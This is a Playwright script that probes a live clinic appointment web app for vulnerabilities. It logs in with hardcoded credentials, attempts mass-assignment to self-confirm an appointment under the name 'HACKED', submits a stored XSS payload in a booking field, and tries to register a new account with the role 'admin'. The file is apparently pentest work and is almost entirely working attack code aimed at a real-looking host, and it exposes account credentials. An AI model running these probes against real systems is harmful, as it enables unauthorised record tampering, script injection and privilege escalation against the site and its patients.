const { chromium } = require('playwright');
const BASE = 'https://uksw-clinic.onrender.com';
const N = (m) => console.log(m);
const api = (page, m, p, b) => page.evaluate(async ([m,p,b]) => {
  try { const r = await fetch(p,{method:m,headers:b?{'content-type':'application/json'}:{},body:b?JSON.stringify(b):undefined}); return {s:r.status,b:(await r.text()).slice(0,400)}; }
  catch(e){return {s:'ERR',b:String(e)};}
}, [m,p,b]);

(async () => {
  const browser = await chromium.launch({ headless: true });
  const sCtx = await browser.newContext(); const s = await sCtx.newPage();
  await s.goto(BASE); await s.fill('#f-user','676767676'); await s.fill('#f-pass','12345678');
  await s.click('button[type=submit]'); await s.waitForTimeout(3000);

  // own appointment id
  const mine = JSON.parse((await api(s,'GET','/api/appointments')).b);
  const id = mine[0] && mine[0].id;
  N('OWN id=' + id + ' status=' + (mine[0]&&mine[0].status));

  // mass-assignment / self-approve on OWN record
  N('MASS-ASSIGN self-confirm -> ' + JSON.stringify(await api(s,'PATCH','/api/appointments/'+id,{status:'Confirmed',nim:'999',studentName:'HACKED',queueNo:1})));
  N('RECHECK -> ' + JSON.stringify(await api(s,'GET','/api/appointments')));

  // stored XSS via reason field
  const xss = '<img src=x onerror=alert(1)>';
  N('XSS booking -> ' + JSON.stringify(await api(s,'POST','/api/appointments',{serviceId:'general',doctorId:'00eebc5b-a0d7-464b-8ee3-688a229d9555',date:'2026-08-20',time:'09:00',mode:'in-person',reason:xss})));

  // registration role injection
  const rCtx = await browser.newContext(); const rp = await rCtx.newPage();
  await rp.goto(BASE);
  N('REGISTER role-inject -> ' + JSON.stringify(await api(rp,'POST','/api/auth/register',{nim:'111222333',username:'111222333',password:'password123',name:'Pentest',role:'admin',faculty:'FTI',email:'x@x.com'})));
  N('REG-then-me -> ' + JSON.stringify(await api(rp,'GET','/api/me')));

  await browser.close();
})();
